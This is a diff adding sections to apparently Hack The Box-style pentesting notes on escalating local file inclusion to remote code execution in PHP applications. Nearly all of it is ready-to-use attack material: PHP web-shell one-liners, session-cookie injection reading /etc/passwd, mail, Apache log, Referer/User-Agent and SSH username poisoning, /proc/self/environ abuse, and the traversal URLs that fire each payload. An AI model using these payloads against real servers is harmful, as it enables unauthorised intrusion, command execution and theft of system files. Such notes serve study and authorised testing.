@@ -219,3 +219,146 @@ wixnic@htb[/htb]$ rm exec.php
 ```
 
 Next, copy `malicious.zip` to the web root to simulate the upload. The files in the zip archive can be referenced using the `#` symbol, which is URL-encoded in the request as `%23`.
+
+## LFI to RCE via Upload
+
+If you can upload a file, just inject the shell payload into it&#x20;
+
+(e.g : `<?php system($_GET['cmd']); ?>` ).
+
+```powershell
+http://example.com/evil.php?cmd=/usr/bin/bash "echo test"
+```
+
+## LFI to RCE via PHP Wrappers
+
+These are a few wrappers that we can use:
+
+* Using file upload forms/functions
+* Using the PHP wrapper expect://command
+* Using the PHP wrapper php://file
+* Using the PHP wrapper php://filter
+* Using PHP input:// stream
+* Using data://text/plain;base64,command
+
+## LFI to RCE via PHP Sessions
+
+Check if the website use PHP Session (PHPSESSID)
+
+```js
+Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
+Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
+```
+
+In PHP these sessions are stored into `/var/lib/php5/sess_[PHPSESSID]` or `/var/lib/php/session/sess_[PHPSESSID]` files
+
+```js
+/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
+user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
+```
+
+Set the cookie to `<?php system('cat /etc/passwd');?>`
+
+```powershell
+login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
+```
+
+Use the LFI to include the PHP session file
+
+```powershell
+login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
+```
+
+## LFI to RCE via Mail PHP Execution
+
+Send an email with telnet through SMTP:
+
+```bash
+telnet 192.168.1.X 25
+
+HELO localhost
+
+MAIL FROM:<root>
+
+RCPT TO:<www-data>
+
+DATA
+
+<?php
+
+echo shell_exec($_REQUEST['cmd']);
+?>
+```
+
+Then, for example, access the file to execute code:
+
+```url
+http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=whoami
+```
+
+## LFI to RCE via Log Poisoning
+
+This can be done with nc or telnet:
+
+```
+nc 192.168.1.102 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+```
+
+You can also add it to the error log by making a request to a page that doesn't exist:
+
+```
+nc 192.168.1.102 80
+GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
+```
+
+Alternatively, we might be able to use the `` Referer` ``header using Burp:
+
+```
+GET / HTTP/1.1
+Referer: <? passthru($_GET[cmd]) ?>
+Host: 192.168.1.159
+Connection: close
+```
+
+Alternatively, we might be able to use the `User-Agent` header using Burp:
+
+```
+GET / HTTP/1.1
+Host: 192.168.1.159
+User-Agent: <?php system($_GET['c']); ?>
+```
+
+Now you can request the log file through the LFI and see the php-code get executed:
+
+```
+http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
+```
+
+## LFI to RCE via SSH
+
+Try to ssh into the box with a PHP code as the username `<?php system($_GET["cmd"]);?>:`
+
+```powershell
+ssh <?php system($_GET["cmd"]);?>@10.10.10.10
+```
+
+Then include the SSH log files inside the Web Application:
+
+```powershell
+http://example.com/index.php?page=/var/log/auth.log&cmd=id
+```
+
+## LFI to RCE via Environ
+
+The `/proc/self/environ` file can be abused using the User-Agent header:
+
+```bash
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+
+User-Agent: \<?=phpinfo(); ?\>
+```
